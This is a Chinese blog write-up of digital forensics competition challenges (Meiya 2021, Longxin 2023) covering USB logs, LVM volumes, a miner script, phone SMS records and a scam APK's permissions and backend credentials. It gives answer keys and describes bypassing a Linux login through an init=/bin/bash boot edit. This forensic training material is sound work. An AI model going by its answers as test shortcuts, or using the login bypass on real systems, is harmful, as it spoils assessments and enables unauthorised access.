<p>E. FB5EF33EDEA8ECB5BF07C5DF5332D29F<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-223732638.png" class=""><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-223948694.png" class=""><br>搜索客户资料可以找到lnk文件<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-224427948.png" class="">  </p>
<p>AC</p>
<h3 id="90-单选题-常威-Windows-计算机中，哪一个档案可以找到USB装置初次连接的时间-1分"><a href="#90-单选题-常威-Windows-计算机中，哪一个档案可以找到USB装置初次连接的时间-1分" class="headerlink" title="90. [单选题] 常威 Windows 计算机中，哪一个档案可以找到USB装置初次连接的时间? (1分)"></a>90. [单选题] 常威 Windows 计算机中，哪一个档案可以找到USB装置初次连接的时间? (1分)</h3><p>A. C:\Windows\setupapi.log</p>
<p>B. C:\Windows\setupapi.setup.log</p>
<p>C. C:\Windows\INF\setupapi.setup.log</p>
<p>D. C:\Windows\INF\setupapi.dev.log<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-224623793.png" class="">  </p>
<img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-224606351.png" class="">  
<img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-224537058.png" class="">  
<p>选C</p>
<h3 id="91-单选题-常威-Windows-计算机接驳了一个3D-打印机，以下哪一个哈希值是属于上述打印机的驱动程式文件中的安装信息文件-INF檔-提示：关键词包含CH341-3分"><a href="#91-单选题-常威-Windows-计算机接驳了一个3D-打印机，以下哪一个哈希值是属于上述打印机的驱动程式文件中的安装信息文件-INF檔-提示：关键词包含CH341-3分" class="headerlink" title="91. [单选题] 常威 Windows 计算机接驳了一个3D 打印机，以下哪一个哈希值是属于上述打印机的驱动程式文件中的安装信息文件(INF檔)? (提示：关键词包含CH341) (3分)"></a>91. [单选题] 常威 Windows 计算机接驳了一个3D 打印机，以下哪一个哈希值是属于上述打印机的驱动程式文件中的安装信息文件(INF檔)? (提示：关键词包含CH341) (3分)</h3><p>A. 1348FA38956<strong>*</strong>1770D7C3E63545BC</p>
<p>B. DBC4F08F835<strong>*</strong>FF95420B352B506A</p>
<p>C. 35E7C67A652<strong>*</strong>611EDE19C37241C5</p>
<p>D. BAE3BE76CC1<strong>*</strong>31EB562ABAFE28DE<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-225023454.png" class="">  </p>
<h3 id="92-填空题-续上题，上述安装信息文件的版本日期是什么-请以阿拉伯数字，及以下格式回答，例-2019年3月4日，请回答20190304-1分"><a href="#92-填空题-续上题，上述安装信息文件的版本日期是什么-请以阿拉伯数字，及以下格式回答，例-2019年3月4日，请回答20190304-1分" class="headerlink" title="92. [填空题] 续上题，上述安装信息文件的版本日期是什么? (请以阿拉伯数字，及以下格式回答，例: 2019年3月4日，请回答20190304) (1分)"></a>92. [填空题] 续上题，上述安装信息文件的版本日期是什么? (请以阿拉伯数字，及以下格式回答，例: 2019年3月4日，请回答20190304) (1分)</h3><h3 id="93-多选题-常威Windows计算机安装了一些与3D-打印机有关的软件，有可能是以下哪个-1分"><a href="#93-多选题-常威Windows计算机安装了一些与3D-打印机有关的软件，有可能是以下哪个-1分" class="headerlink" title="93. [多选题] 常威Windows计算机安装了一些与3D 打印机有关的软件，有可能是以下哪个? (1分)"></a>93. [多选题] 常威Windows计算机安装了一些与3D 打印机有关的软件，有可能是以下哪个? (1分)</h3><p>A. Ultimaker Cura</p>
<p>B. 3DPrinterOS</p>
<p>C. Simplify3D</p>
<p>D. Creality Slicer<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-225614378.png" class=""><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-225842339.png" class=""><br>AD搜爆</p>
<h3 id="94-单选题-续上题，哪一个档案记录了切片软件Creality-Slicer曾经开启的3d立体模块-stl-纪录-1分"><a href="#94-单选题-续上题，哪一个档案记录了切片软件Creality-Slicer曾经开启的3d立体模块-stl-纪录-1分" class="headerlink" title="94. [单选题] 续上题，哪一个档案记录了切片软件Creality Slicer曾经开启的3d立体模块(.stl)纪录? (1分)"></a>94. [单选题] 续上题，哪一个档案记录了切片软件Creality Slicer曾经开启的3d立体模块(.stl)纪录? (1分)</h3><p>A. \Users\Chris Paul\AppData\Roaming\Creality Slicer\stderr.log</p>
<p>B. \Users\Chris Paul\AppData\Roaming\Creality Slicer\stdout.log</p>
<p>C. \Users\Chris Paul\AppData\Roaming\Creality Slicer\4.8\Creality Slicer.cfg</p>
<p>D. \Users\Chris Paul\AppData\Roaming\Creality Slicer\4.8\Creality Slicer.log<br>试了一下好多文件都有.stl …</p>
<h3 id="95-多选题-续上题，哪一个3d立体模块-stl-曾用切片软件Creality-Slicer开启-2分"><a href="#95-多选题-续上题，哪一个3d立体模块-stl-曾用切片软件Creality-Slicer开启-2分" class="headerlink" title="95. [多选题] 续上题，哪一个3d立体模块(.stl)曾用切片软件Creality Slicer开启? (2分)"></a>95. [多选题] 续上题，哪一个3d立体模块(.stl)曾用切片软件Creality Slicer开启? (2分)</h3><p>A. clip_sideb.stl</p>
<p>B. frame.stl</p>
<p>C. trigger.stl</p>
<p>D. hand_guard.stl<br>AB<br>上题给的文件内容里搜</p>
<h2 id="linux计算机"><a href="#linux计算机" class="headerlink" title="linux计算机"></a>linux计算机</h2><h3 id="96-填空题-哪一个是Wai-Linux1-E01-鉴证映像中Linux-LVM-磁盘分区的长度-请以阿拉伯数字回答-1分"><a href="#96-填空题-哪一个是Wai-Linux1-E01-鉴证映像中Linux-LVM-磁盘分区的长度-请以阿拉伯数字回答-1分" class="headerlink" title="96. [填空题] 哪一个是Wai_Linux1.E01 鉴证映像中Linux LVM 磁盘分区的长度? (请以阿拉伯数字回答) (1分)"></a>96. [填空题] 哪一个是Wai_Linux1.E01 鉴证映像中Linux LVM 磁盘分区的长度? (请以阿拉伯数字回答) (1分)</h3><p>原本尝试直接使用美亚去仿真结果发现无法使用仿真工具来绕过密码.可以参考这篇文章来重置kali的密码<a href="https://blog.csdn.net/weixin_44953600/article/details/110402058">kali密码重置</a><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241107-121431851.png" class=""><br>将ro改为rw,然后再后面加上init=/bin/bash<br>然后f10就可以进入root的交互页面了,直接passwd改密码<br>使用<br>fdisk -l<br>即可查看磁盘分区长度<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241107-121727200.png" class="">  </p>
<h3 id="97-填空题-常威-LINUX-计算机安装在逻辑卷管理-Logical-Volume-Manager-的磁盘分区上-哪一个是卷组-Volume-group-的通用唯一标识符-UUID-请以英文全大写及阿拉伯数字回答，不用输入”-“-1分"><a href="#97-填空题-常威-LINUX-计算机安装在逻辑卷管理-Logical-Volume-Manager-的磁盘分区上-哪一个是卷组-Volume-group-的通用唯一标识符-UUID-请以英文全大写及阿拉伯数字回答，不用输入”-“-1分" class="headerlink" title="97. [填空题] 常威 LINUX 计算机安装在逻辑卷管理(Logical Volume Manager)的磁盘分区上, 哪一个是卷组(Volume group) 的通用唯一标识符(UUID)? (请以英文全大写及阿拉伯数字回答，不用输入”-“) (1分)"></a>97. [填空题] 常威 LINUX 计算机安装在逻辑卷管理(Logical Volume Manager)的磁盘分区上, 哪一个是卷组(Volume group) 的通用唯一标识符(UUID)? (请以英文全大写及阿拉伯数字回答，不用输入”-“) (1分)</h3><p>vgdisplay<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241107-121837072.png" class="">  </p>
<p>直接美亚一把梭<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-234837165.png" class="">  </p>
<h3 id="98-多选题-续上题，哪一个是逻辑卷-Logical-Volume-设定的名字-2分"><a href="#98-多选题-续上题，哪一个是逻辑卷-Logical-Volume-设定的名字-2分" class="headerlink" title="98. [多选题] 续上题，哪一个是逻辑卷(Logical Volume )设定的名字? (2分)"></a>98. [多选题] 续上题，哪一个是逻辑卷(Logical Volume )设定的名字? (2分)</h3><p>A. swap</p>
<p>B. root</p>
<p>C. var</p>
<p>D. home</p>
<ol>
<li><p>查看所有逻辑卷<br>使用 lvdisplay 命令查看所有逻辑卷的详细信息：<br>lvdisplay</p>
<img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241107-122904028.png" class="">  
<img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241107-122926803.png" class="">  
</li>
<li><p>查看卷组信息<br>使用 vgdisplay 命令查看卷组信息，包括卷组名称、大小、可用空间等。<br>vgdisplay</p>
</li>
<li>查看物理卷信息<br>使用 pvdisplay 命令查看物理卷信息，包括物理卷的设备名称、所属卷组、总大小和可用空间等。<br>pvdisplay</li>
<li>简化查看<br>可以使用 lsblk 命令以树形结构显示所有磁盘、分区、卷组和逻辑卷：<br>lsblk</li>
<li>查看简要信息<br>使用 lvs、vgs、pvs 命令可以快速查看逻辑卷、卷组和物理卷的简要信息：</li>
</ol>
<p>lvs：显示逻辑卷列表<br>vgs：显示卷组列表<br>pvs：显示物理卷列表</p>
<h3 id="99-单选题-常威-LINUX-计算机曾试用挖矿程式”T-Rex”，在相关脚本-script-中哪一个是工人-worker-的名称-1分"><a href="#99-单选题-常威-LINUX-计算机曾试用挖矿程式”T-Rex”，在相关脚本-script-中哪一个是工人-worker-的名称-1分" class="headerlink" title="99. [单选题] 常威 LINUX 计算机曾试用挖矿程式”T-Rex”，在相关脚本(script)中哪一个是工人(worker)的名称? (1分)"></a>99. [单选题] 常威 LINUX 计算机曾试用挖矿程式”T-Rex”，在相关脚本(script)中哪一个是工人(worker)的名称? (1分)</h3><p>A. stratum</p>
<p>B. rig0</p>
<p>C. ethash</p>
<p>D. E365625f402537151304ceba7C7D9dF0C7E82986</p>
<img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241107-123412134.png" class="">  
<p>搜索T-Rex再bash记录里看到sh文件，打开可以发现rig0</p>
<h3 id="100-填空题-LINUX-系统中利用fdisk-指令下，下列哪一个是-“exFAT”的磁盘分区类型编号-Partition-type-id-请以英文全大写及阿拉伯数字回答-1分"><a href="#100-填空题-LINUX-系统中利用fdisk-指令下，下列哪一个是-“exFAT”的磁盘分区类型编号-Partition-type-id-请以英文全大写及阿拉伯数字回答-1分" class="headerlink" title="100. [填空题] LINUX 系统中利用fdisk 指令下，下列哪一个是 “exFAT”的磁盘分区类型编号(Partition type id)? (请以英文全大写及阿拉伯数字回答) (1分)"></a>100. [填空题] LINUX 系统中利用fdisk 指令下，下列哪一个是 “exFAT”的磁盘分区类型编号(Partition type id)? (请以英文全大写及阿拉伯数字回答) (1分)</h3><h3 id="101-单选题-在Linux-的环境下，以下哪一个指令用于激活扫描到的卷组-Volume-group-1分"><a href="#101-单选题-在Linux-的环境下，以下哪一个指令用于激活扫描到的卷组-Volume-group-1分" class="headerlink" title="101. [单选题] 在Linux 的环境下，以下哪一个指令用于激活扫描到的卷组(Volume group) (1分)"></a>101. [单选题] 在Linux 的环境下，以下哪一个指令用于激活扫描到的卷组(Volume group) (1分)</h3><p>A. vgscan</p>
<p>B. vgchange</p>
<p>C. vgdisplay</p>
<p>D. vgactive<br>B<br>都用—help查一下<br>卷组创建完毕后，可以通过 vgchange 命令来激活卷组，而无法重启系统。</p>
<h3 id="102-单选题-在Linux-的环境下，下列哪一个指令可以删除内有档案的文件夹-1分"><a href="#102-单选题-在Linux-的环境下，下列哪一个指令可以删除内有档案的文件夹-1分" class="headerlink" title="102. [单选题] 在Linux 的环境下，下列哪一个指令可以删除内有档案的文件夹? (1分)"></a>102. [单选题] 在Linux 的环境下，下列哪一个指令可以删除内有档案的文件夹? (1分)</h3><p>A. rm -d</p>
<p>B. rm -r</p>
<p>C. rm -rd</p>
<p>D. rm -rf</p>
<p>D</p>
<h3 id="103-填空题-常威-LINUX-计算机逻辑滚动条-Logical-Volume-路径“vg-home”使用了甚么系统建立-请以英文全大写回答-2分"><a href="#103-填空题-常威-LINUX-计算机逻辑滚动条-Logical-Volume-路径“vg-home”使用了甚么系统建立-请以英文全大写回答-2分" class="headerlink" title="103. [填空题] 常威 LINUX 计算机逻辑滚动条 (Logical Volume) 路径“vg/home”使用了甚么系统建立? (请以英文全大写回答) (2分)"></a>103. [填空题] 常威 LINUX 计算机逻辑滚动条 (Logical Volume) 路径“vg/home”使用了甚么系统建立? (请以英文全大写回答) (2分)</h3><p>使用lvdisplay查看<br><img src="image-18.png" alt="alt text"></p>
<h3 id="104-填空题-常威-LINUX-计算机逻辑滚动条-Logical-Volume-路径-“vg-root”-的Current-LE是什么-请以阿拉伯数字回答-1分"><a href="#104-填空题-常威-LINUX-计算机逻辑滚动条-Logical-Volume-路径-“vg-root”-的Current-LE是什么-请以阿拉伯数字回答-1分" class="headerlink" title="104. [填空题] 常威 LINUX 计算机逻辑滚动条 (Logical Volume) 路径 “vg/root” 的Current LE是什么? (请以阿拉伯数字回答) (1分)"></a>104. [填空题] 常威 LINUX 计算机逻辑滚动条 (Logical Volume) 路径 “vg/root” 的Current LE是什么? (请以阿拉伯数字回答) (1分)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241107-123829401.png" class="">  
<p>使用lvdisplay查看</p>
<h3 id="105-填空题-常威-LINUX-计算机扇区群组-Volume-group-的Total-PE是甚么-请以阿拉伯数字回答-1分"><a href="#105-填空题-常威-LINUX-计算机扇区群组-Volume-group-的Total-PE是甚么-请以阿拉伯数字回答-1分" class="headerlink" title="105. [填空题] 常威 LINUX 计算机扇区群组 (Volume group)的Total PE是甚么? (请以阿拉伯数字回答) (1分)"></a>105. [填空题] 常威 LINUX 计算机扇区群组 (Volume group)的Total PE是甚么? (请以阿拉伯数字回答) (1分)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241107-123900943.png" class="">  
<p>使用vgdisplay查看</p>
]]></content>
  </entry>
  <entry>
    <title>龙信2023</title>
    <url>/2024/10/20/%E9%99%87%E4%BF%A12023/</url>
    <content><![CDATA[<h1 id="手机取证"><a href="#手机取证" class="headerlink" title="手机取证"></a>手机取证</h1><h2 id="1-请分析涉案手机的设备标识是-。（标准格式：12345678）"><a href="#1-请分析涉案手机的设备标识是-。（标准格式：12345678）" class="headerlink" title="1.请分析涉案手机的设备标识是_。（标准格式：12345678）"></a>1.请分析涉案手机的设备标识是<em>_</em>。（标准格式：12345678）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/1-1.jpg" class="" title="alt text">
<h2 id="2-请确认嫌疑人首次安装目标APP的安装时间是-。（标准格式：2023-09-13-11-32-23）"><a href="#2-请确认嫌疑人首次安装目标APP的安装时间是-。（标准格式：2023-09-13-11-32-23）" class="headerlink" title="2.请确认嫌疑人首次安装目标APP的安装时间是__。（标准格式：2023-09-13.11:32:23）"></a>2.请确认嫌疑人首次安装目标APP的安装时间是<strong>__</strong>。（标准格式：2023-09-13.11:32:23）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/1-2.jpg" class="" title="alt text">
<h2 id="3-此检材共连接过-个WiFi。（标准格式：1）"><a href="#3-此检材共连接过-个WiFi。（标准格式：1）" class="headerlink" title="3.此检材共连接过__个WiFi。（标准格式：1）"></a>3.此检材共连接过<strong>__</strong>个WiFi。（标准格式：1）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/1.jpg" class="" title="alt text">
<h2 id="4-嫌疑人手机短信记录中未读的短信共有-条。（标准格式：12）"><a href="#4-嫌疑人手机短信记录中未读的短信共有-条。（标准格式：12）" class="headerlink" title="4.嫌疑人手机短信记录中未读的短信共有__条。（标准格式：12）"></a>4.嫌疑人手机短信记录中未读的短信共有<strong>__</strong>条。（标准格式：12）</h2><p>查看手机短信数据库<br>mmssms.db 是 Android 系统中用于存储短信和多媒体信息的数据库文件，主要用于管理和存储短信（SMS）和多媒体消息（MMS）。该文件通常位于 Android 系统的内部存储中，并通过系统自带的短信应用或其他第三方应用进行访问和管理。<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-230922409.png" class=""><br>其read列应该为是否读取<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/3.jpg" class="" title="alt text"><br>数一下有17个</p>
<h2 id="5-嫌疑人检材手机在浏览器中下载海报背景图的网址是-。（标准格式：http-www-baidu-com-admin-index-html）"><a href="#5-嫌疑人检材手机在浏览器中下载海报背景图的网址是-。（标准格式：http-www-baidu-com-admin-index-html）" class="headerlink" title="5.嫌疑人检材手机在浏览器中下载海报背景图的网址是_。（标准格式：http://www.baidu.com/admin/index.html）"></a>5.嫌疑人检材手机在浏览器中下载海报背景图的网址是<strong><em>_</em></strong>。（标准格式：<a href="http://www.baidu.com/admin/index.html）">http://www.baidu.com/admin/index.html）</a></h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/4.jpg" class="" title="alt text">
<p>搜索海报可以得到背景网址</p>
<h2 id="6-请分析涉案海报的推广ID是-。（标准格式：123456）"><a href="#6-请分析涉案海报的推广ID是-。（标准格式：123456）" class="headerlink" title="6.请分析涉案海报的推广ID是__。（标准格式：123456）"></a>6.请分析涉案海报的推广ID是<strong><em>__</em></strong>。（标准格式：123456）</h2><p>打开文件分类中的图片，可以找到背景与下载海报相同的<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/6.jpg" class="" title="alt text"></p>
<h2 id="7-嫌疑人通过短信群发去推广APP，请问收件人中有-个号码是无效的。（标准格式：12）"><a href="#7-嫌疑人通过短信群发去推广APP，请问收件人中有-个号码是无效的。（标准格式：12）" class="headerlink" title="7.嫌疑人通过短信群发去推广APP，请问收件人中有__个号码是无效的。（标准格式：12）"></a>7.嫌疑人通过短信群发去推广APP，请问收件人中有__个号码是无效的。（标准格式：12）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/7.jpg" class="" title="alt text">
<p>只收到了一条运营商的信息，所以应该是一条</p>
<h2 id="8-通过分析，嫌疑人推送的微信账号是-。（标准格式：Lx20230916）"><a href="#8-通过分析，嫌疑人推送的微信账号是-。（标准格式：Lx20230916）" class="headerlink" title="8.通过分析，嫌疑人推送的微信账号是__。（标准格式：Lx20230916）"></a>8.通过分析，嫌疑人推送的微信账号是<strong>__</strong>。（标准格式：Lx20230916）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/8-1.jpg" class="" title="alt text">
<img src="/2024/10/20/%E9%99%87%E4%BF%A12023/8-2.jpg" class="" title="alt text">
<p>有开始为同活的微信后面的为个人微信<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/8-3.jpg" class="" title="alt text"></p>
<h2 id="9-请校验嫌疑人使用的“变声器”APK的包名是-。（标准格式：com-baidu-com）"><a href="#9-请校验嫌疑人使用的“变声器”APK的包名是-。（标准格式：com-baidu-com）" class="headerlink" title="9.请校验嫌疑人使用的“变声器”APK的包名是__。（标准格式：com.baidu.com）"></a>9.请校验嫌疑人使用的“变声器”APK的包名是<strong><em>__</em></strong>。（标准格式：com.baidu.com）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-231352187.png" class="">  
<h2 id="10-号商的联系人注册APP的ID是-。（标准格式：12345678）"><a href="#10-号商的联系人注册APP的ID是-。（标准格式：12345678）" class="headerlink" title="10.号商的联系人注册APP的ID是_。（标准格式：12345678）"></a>10.号商的联系人注册APP的ID是<strong><strong>_</strong></strong>。（标准格式：12345678）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/10jpg.jpg" class="" title="alt text">
<p>在我的好友处可以找到</p>
<h2 id="11-嫌疑人于2022年11月份在城市。（标准格式：成都）"><a href="#11-嫌疑人于2022年11月份在城市。（标准格式：成都）" class="headerlink" title="11.嫌疑人于2022年11月份在城市。（标准格式：成都）"></a>11.嫌疑人于2022年11月份在城市。（标准格式：成都）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/11-3.jpg" class="" title="alt text">
<p>聊天记录中可以看到其发送了个人位置的图片<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/11-2.jpg" class="" title="alt text"><br>因为在发送过程中会产生缩略图和压缩，所以我们直接找最大的图片就是原图<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/11-1.jpg" class="" title="alt text"><br>在属性中可以得到位置经纬度<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/11-4.jpg" class="" title="alt text"></p>
<h2 id="12-嫌疑人共购买-个QQ号。（标准格式：1）"><a href="#12-嫌疑人共购买-个QQ号。（标准格式：1）" class="headerlink" title="12.嫌疑人共购买_个QQ号。（标准格式：1）"></a>12.嫌疑人共购买<em>_</em>个QQ号。（标准格式：1）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/12.jpg" class="" title="alt text">
<p>8个之前还有3个</p>
<h1 id="apk"><a href="#apk" class="headerlink" title="apk"></a>apk</h1><h2 id="1-分析手机镜像，导出涉案apk，此apk的md5值是-。（标准格式：abc123）"><a href="#1-分析手机镜像，导出涉案apk，此apk的md5值是-。（标准格式：abc123）" class="headerlink" title="1.分析手机镜像，导出涉案apk，此apk的md5值是__。（标准格式：abc123）"></a>1.分析手机镜像，导出涉案apk，此apk的md5值是<strong><em>__</em></strong>。（标准格式：abc123）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/2-1-1.jpg" class="" title="alt text">
<h2 id="2-分析该apk，apk的包名是-。（标准格式：com-qqj-123）"><a href="#2-分析该apk，apk的包名是-。（标准格式：com-qqj-123）" class="headerlink" title="2.分析该apk，apk的包名是__。（标准格式：com.qqj.123）"></a>2.分析该apk，apk的包名是<strong><em>__</em></strong>。（标准格式：com.qqj.123）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/2-2.jpg" class="" title="alt text">
<h2 id="3-分析该apk，apk的包名是-。（标准格式：com-qqj-123）"><a href="#3-分析该apk，apk的包名是-。（标准格式：com-qqj-123）" class="headerlink" title="3.分析该apk，apk的包名是__。（标准格式：com.qqj.123）"></a>3.分析该apk，apk的包名是<strong><em>__</em></strong>。（标准格式：com.qqj.123）</h2><h2 id="4-分析该apk，请问该apk最高支持运行的安卓版本是-。（标准格式：11）"><a href="#4-分析该apk，请问该apk最高支持运行的安卓版本是-。（标准格式：11）" class="headerlink" title="4.分析该apk，请问该apk最高支持运行的安卓版本是_。（标准格式：11）"></a>4.分析该apk，请问该apk最高支持运行的安卓版本是<strong><em>_</em></strong>。（标准格式：11）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/2-3-3.jpg" class="" title="alt text">
<p>查看AndroidManifest.xml可以找到其运行api的版本访问如下是不同api对应的安卓版本<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/2-3-1.jpg" class="" title="alt text"><br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/2-3-2.jpg" class="" title="alt text"><br>32对应安卓12</p>
<h2 id="5-分析该apk，app的主函数入口是-。（标准格式：com-qqj-123-MainActivity）"><a href="#5-分析该apk，app的主函数入口是-。（标准格式：com-qqj-123-MainActivity）" class="headerlink" title="5.分析该apk，app的主函数入口是_。（标准格式：com.qqj.123.MainActivity）"></a>5.分析该apk，app的主函数入口是<strong><strong>_</strong></strong>。（标准格式：com.qqj.123.MainActivity）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/2-5.jpg" class="" title="alt text">
<p>AndroidManifest.xml的activity标签可以找到主函数入口，当然雷电直接取好了<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/2-5-2.jpg" class="" title="alt text"></p>
<h2 id="6-分析该apk，请问窃取短信的权限名称是-。（标准格式：android-permission-NETWORK）"><a href="#6-分析该apk，请问窃取短信的权限名称是-。（标准格式：android-permission-NETWORK）" class="headerlink" title="6.分析该apk，请问窃取短信的权限名称是__。（标准格式：android.permission.NETWORK）"></a>6.分析该apk，请问窃取短信的权限名称是<strong><em>__</em></strong>。（标准格式：android.permission.NETWORK）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/2-6.jpg" class="" title="alt text">
<h2 id="7-APP使用的OPPO的appkey值是-。（标准格式：AB-12345678）"><a href="#7-APP使用的OPPO的appkey值是-。（标准格式：AB-12345678）" class="headerlink" title="7.APP使用的OPPO的appkey值是__。（标准格式：AB-12345678）"></a>7.APP使用的OPPO的appkey值是<strong><em>__</em></strong>。（标准格式：AB-12345678）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/2-7.jpg" class="" title="alt text">
<p>直接看第三方服务</p>
<h2 id="8-分析apk源码，该APK后台地址是-。（标准格式：com-qqj-123）"><a href="#8-分析apk源码，该APK后台地址是-。（标准格式：com-qqj-123）" class="headerlink" title="8.分析apk源码，该APK后台地址是__。（标准格式：com.qqj.123）"></a>8.分析apk源码，该APK后台地址是<strong><em>__</em></strong>。（标准格式：com.qqj.123）</h2><p>在敏感信息处可以看出网站<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/2-8.jpg" class="" title="alt text"><br>反编译后直接搜也可以<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/2-8-2.jpg" class="" title="alt text"></p>
<h2 id="9-分析apk源码，APP-后台地址登录的盐值是-。（标准格式：123abc-amp-）"><a href="#9-分析apk源码，APP-后台地址登录的盐值是-。（标准格式：123abc-amp-）" class="headerlink" title="9.分析apk源码，APP 后台地址登录的盐值是_。（标准格式：123abc=%$&amp;）"></a>9.分析apk源码，APP 后台地址登录的盐值是<strong><em>_</em></strong>。（标准格式：123abc=%$&amp;）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/2-9.jpg" class="" title="alt text">
<p>反编译直接搜salt</p>
<h2 id="10-分析apk源码，该APK后台地址登录密码是-。（标准格式：longxin123）"><a href="#10-分析apk源码，该APK后台地址登录密码是-。（标准格式：longxin123）" class="headerlink" title="10.分析apk源码，该APK后台地址登录密码是__。（标准格式：longxin123）"></a>10.分析apk源码，该APK后台地址登录密码是<strong>__</strong>。（标准格式：longxin123）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/2-10.jpg" class="" title="alt text">
<p>反编译在192.168.5.80/login可以看到密码</p>
<h2 id="11-对-APP-安装包进行分析，该-APP打包平台调证值是-。（标准格式：HER45678）"><a href="#11-对-APP-安装包进行分析，该-APP打包平台调证值是-。（标准格式：HER45678）" class="headerlink" title="11.对 APP 安装包进行分析，该 APP打包平台调证值是__。（标准格式：HER45678）"></a>11.对 APP 安装包进行分析，该 APP打包平台调证值是<strong>__</strong>。（标准格式：HER45678）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/2-11.jpg" class="" title="alt text">
<h2 id="12-此apk抓包获取到的可访问网站域名IP地址是-。（标准格式：192-168-1-1）"><a href="#12-此apk抓包获取到的可访问网站域名IP地址是-。（标准格式：192-168-1-1）" class="headerlink" title="12.此apk抓包获取到的可访问网站域名IP地址是_。（标准格式：192.168.1.1）"></a>12.此apk抓包获取到的可访问网站域名IP地址是<strong><em>_</em></strong>。（标准格式：192.168.1.1）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/2-12.jpg" class="" title="alt text">
<p>敏感信息里可以直接看到，当然也可以用模拟器打开后网络代理改为192.168.20.1:8888然后直接用bp抓包</p>
<h2 id="13-分析apk源码，该apk的加密方式key值是-。（标准格式：12345678）"><a href="#13-分析apk源码，该apk的加密方式key值是-。（标准格式：12345678）" class="headerlink" title="13.分析apk源码，该apk的加密方式key值是__。（标准格式：12345678）"></a>13.分析apk源码，该apk的加密方式key值是<strong><em>__</em></strong>。（标准格式：12345678）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/2-14.jpg" class="" title="alt text">
<h2 id="14-结合计算机镜像，综合分析，请问该apk开发者公司的座机号码是-。（标准格式：4001122334）"><a href="#14-结合计算机镜像，综合分析，请问该apk开发者公司的座机号码是-。（标准格式：4001122334）" class="headerlink" title="14.结合计算机镜像，综合分析，请问该apk开发者公司的座机号码是__。（标准格式：4001122334）"></a>14.结合计算机镜像，综合分析，请问该apk开发者公司的座机号码是__。（标准格式：4001122334）</h2><h1 id="介质取证"><a href="#介质取证" class="headerlink" title="介质取证"></a>介质取证</h1><h2 id="1-对PC镜像分析，请确定涉案电脑的开机密码是-。（标准格式：123456）"><a href="#1-对PC镜像分析，请确定涉案电脑的开机密码是-。（标准格式：123456）" class="headerlink" title="1.对PC镜像分析，请确定涉案电脑的开机密码是_。（标准格式：123456）"></a>1.对PC镜像分析，请确定涉案电脑的开机密码是<strong><em>_</em></strong>。（标准格式：123456）</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-234104694.png" class="">  
<p>Longxin360004</p>
